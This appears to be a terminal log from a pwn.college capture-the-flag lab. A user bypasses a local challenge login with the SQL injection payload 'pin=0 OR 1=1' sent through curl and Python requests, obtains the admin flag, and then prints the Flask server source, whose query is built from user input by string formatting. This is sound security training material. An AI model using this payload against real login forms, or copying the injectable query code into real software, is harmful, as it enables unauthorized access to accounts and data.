@@ -1,0 +1,155 @@
+hacker@web-security~sqli-1:/challenge$ curl -v "http://challenge.localhost:80/login-page" --data "user-alias=admin&pin=0 OR 1=1" -X POST
+Note: Unnecessary use of -X or --request, POST is already inferred.
+* Host challenge.localhost:80 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:80...
+* connect to ::1 port 80 from ::1 port 36676 failed: Connection refused
+*   Trying 127.0.0.1:80...
+* Connected to challenge.localhost (127.0.0.1) port 80
+* using HTTP/1.x
+> POST /login-page HTTP/1.1
+> Host: challenge.localhost
+> User-Agent: curl/8.14.1
+> Accept: */*
+> Content-Length: 29
+> Content-Type: application/x-www-form-urlencoded
+> 
+* upload completely sent off: 29 bytes
+DEBUG: query="SELECT rowid, * FROM users WHERE username = 'admin' AND pin = 0 OR 1=1"
+127.0.0.1 - - [21/Oct/2025 18:22:55] "POST /login-page HTTP/1.1" 302 -
+< HTTP/1.1 302 FOUND
+< Server: Werkzeug/3.0.6 Python/3.8.10
+< Date: Tue, 21 Oct 2025 18:22:55 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 209
+< Location: /login-page
+< Vary: Cookie
+< Set-Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aPfPfw.Q9PA290SoJEIyGQi08UosoatmiE; HttpOnly; Path=/
+< Connection: close
+< 
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/login-page">/login-page</a>. If not, click the link.
+* shutting down connection #0
+hacker@web-security~sqli-1:/challenge$ python
+Python 3.12.11 (main, Jun  3 2025, 15:41:47) [GCC 14.2.1 20250322] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import requests as req
+>>> s = req.Session()
+>>> s.post("http://challenge.localhost:80/login-page"{"user-alias":"admin", "pin":"0 OR 1=1"}
+  File "<stdin>", line 1
+    s.post("http://challenge.localhost:80/login-page"{"user-alias":"admin", "pin":"0 OR 1=1"}
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+SyntaxError: invalid syntax. Perhaps you forgot a comma?
+>>> s.post("http://challenge.localhost:80/login-page,"{"user-alias":"admin", "pin":"0 OR 1=1"})
+  File "<stdin>", line 1
+    s.post("http://challenge.localhost:80/login-page,"{"user-alias":"admin", "pin":"0 OR 1=1"})
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+SyntaxError: invalid syntax. Perhaps you forgot a comma?
+>>> s.post("http://challenge.localhost:80/login-page","{"user-alias":"admin", "pin":"0 OR 1=1"})
+  File "<stdin>", line 1
+    s.post("http://challenge.localhost:80/login-page","{"user-alias":"admin", "pin":"0 OR 1=1"})
+                                                      ^^^^^^^^^^^^^
+SyntaxError: invalid syntax. Perhaps you forgot a comma?
+>>> s.post("http://challenge.localhost:80/login-page",{"user-alias":"admin", "pin":"0 OR 1=1"})
+DEBUG: query="SELECT rowid, * FROM users WHERE username = 'admin' AND pin = 0 OR 1=1"
+127.0.0.1 - - [21/Oct/2025 18:28:49] "POST /login-page HTTP/1.1" 302 -
+127.0.0.1 - - [21/Oct/2025 18:28:49] "GET /login-page HTTP/1.1" 200 -
+<Response [200]>
+>>> s.post("http://challenge.localhost:80/login-page",{"user-alias":"admin", "pin":"0 OR 1=1"}).text
+DEBUG: query="SELECT rowid, * FROM users WHERE username = 'admin' AND pin = 0 OR 1=1"
+127.0.0.1 - - [21/Oct/2025 18:29:04] "POST /login-page HTTP/1.1" 302 -
+127.0.0.1 - - [21/Oct/2025 18:29:04] "GET /login-page HTTP/1.1" 200 -
+'<html><body>Hello, admin!<br>Here is your flag: pwn.college{on7n7-k2zqfxVUvXJ5Q3SuXrc1Y.dNzN1YDL1AjM5MzW}\n\n        <hr>\n        <form method=post>\n        User:<input type=text name=user-alias>Pin:<input type=text name=pin><input type=submit value=Submit>\n        </form>\n        </body></html>\n    '
+>>> 
+[2]+  Stopped                 python
+hacker@web-security~sqli-1:/challenge$ cat server
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import random
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+import sqlite3
+import tempfile
+
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+
+db = TemporaryDB()
+
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as pin""", [random.randrange(2**32, 2**63)])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, 1337 as pin""")
+
+
+@app.route("/login-page", methods=["POST"])
+def challenge_post():
+    username = flask.request.form.get("user-alias")
+    pin = flask.request.form.get("pin")
+    if not username:
+        flask.abort(400, "Missing `user-alias` form parameter")
+    if not pin:
+        flask.abort(400, "Missing `pin` form parameter")
+
+    if pin[0] not in "0123456789":
+        flask.abort(400, "Invalid pin")
+
+    try:
+        # https://www.sqlite.org/lang_select.html
+        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND pin = { pin }"
+        print(f"DEBUG: {query=}")
+        user = db.execute(query).fetchone()
+    except sqlite3.Error as e:
+        flask.abort(500, f"Query: {query}\nError: {e}")
+
+    if not user:
+        flask.abort(403, "Invalid username or pin")
+
+    flask.session["user"] = username
+    return flask.redirect(flask.request.path)
+
+
+@app.route("/login-page", methods=["GET"])
+def challenge_get():
+    if not (username := flask.session.get("user", None)):
+        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
+    else:
+        page = f"<html><body>Hello, {username}!"
+        if username == "admin":
+            page += "<br>Here is your flag: " + open("/flag").read()
+
+    return (
+        page
+        + """
+        <hr>
+        <form method=post>
+        User:<input type=text name=user-alias>Pin:<input type=text name=pin><input type=submit value=Submit>
+        </form>
+        </body></html>
+    """
+    )
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+hacker@web-security~sqli-1:/challenge$ 
